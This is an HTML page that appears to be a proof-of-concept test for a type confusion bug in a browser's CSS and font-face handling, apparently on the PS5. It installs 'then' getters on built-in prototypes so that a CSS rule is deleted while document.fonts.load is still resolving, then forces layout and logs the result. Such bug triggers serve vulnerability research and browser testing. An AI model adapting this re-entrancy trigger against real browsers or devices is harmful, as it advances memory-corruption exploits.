<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 CSSParser Type Confusion Test</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };




if (window.testRunner) {

    testRunner.dumpAsText();

    testRunner.waitUntilDone();

}

let logText = "";

function log(s) {

    logText += s + "\n";

    console.log(s);

}

function finish() {

    document.body.textContent = logText + "\nDONE";

    if (window.testRunner)

        testRunner.notifyDone();

}

function installGetter(proto, name, callback) {

    const old = Object.getOwnPropertyDescriptor(proto, "then");

    Object.defineProperty(proto, "then", {

        configurable: true,

        get() {

            callback(name);

            if (old)

                Object.defineProperty(proto, "then", old);

            else

                delete proto.then;

            return old && old.value;

        }

    });

}

window.onload = async function () {

    const style = document.createElement("style");

    style.textContent = `

@font-face {

    font-family: "asanff";

    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");

    unicode-range: U+0041;

}

@font-face {

    font-family: "asanff";

    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");

    unicode-range: U+0042;

}

`;

    document.head.appendChild(style);

    const probe = document.createElement("span");

    probe.textContent = "AB";

    probe.style.fontFamily = "asanff";

    document.body.appendChild(probe);

    document.body.offsetTop;

    log("initial style resolved; cssRules=" + style.sheet.cssRules.length);

    let fired = false;

    function reenter(where) {

        if (fired)

            return;

        fired = true;

        log("then getter fired via " + where);

        try {

            style.sheet.deleteRule(0);

            log("deleteRule(0) executed");

        } catch (e) {

            log("deleteRule failed: " + e.name + ": " + e.message);

        }

        try {

            document.body.offsetTop;

            getComputedStyle(probe).fontFamily;

            log("style/layout forced after deleteRule");

        } catch (e) {

            log("style/layout force failed: " + e.name + ": " + e.message);

        }

    }

    installGetter(FontFace.prototype, "FontFace.prototype", reenter);

    installGetter(FontFaceSet.prototype, "FontFaceSet.prototype", reenter);

    installGetter(Array.prototype, "Array.prototype", reenter);

    log("calling document.fonts.load");

    try {

        const faces = await document.fonts.load('16px "asanff"', "AB");

        log("document.fonts.load resolved; faces=" + faces.length);

    } catch (e) {

        log("document.fonts.load rejected: " + e.name + ": " + e.message);

    }

    log("getter fired=" + fired);

    finish();

};

</script>

</body>
</html>
